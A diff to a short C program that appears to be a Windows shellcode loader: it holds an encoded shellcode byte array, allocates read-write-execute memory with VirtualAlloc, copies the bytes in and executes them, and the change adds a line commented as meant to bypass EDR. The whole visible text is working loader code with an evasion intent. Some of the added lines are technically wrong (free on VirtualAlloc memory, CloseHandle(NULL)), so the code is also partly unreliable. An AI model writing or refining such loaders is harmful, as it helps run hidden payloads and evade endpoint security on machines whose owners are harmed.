@@ -27,8 +27,16 @@ unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x0
 "\xbf\x41\x76\xd7\xd5\xa3\xa4\xf4\xd3\x22\x58";
 
 int main(int argc, char **argv) {
-    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, shellcode, sizeof(shellcode));
-    ((void(*)())exec)();
+    void *shellcode_pointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);
+    if (shellcode_pointer == NULL) {
+        fputs("NULL shellcode pointer", stderr);
+        return 2;
+    }
+
+    memcpy(shellcode_pointer, shellcode, sizeof(shellcode));
+    ((void(*)())shellcode_pointer)();
+
+    free(shellcode_pointer);
+    CloseHandle(NULL);  // bypass my EDR
     return 0;
 }
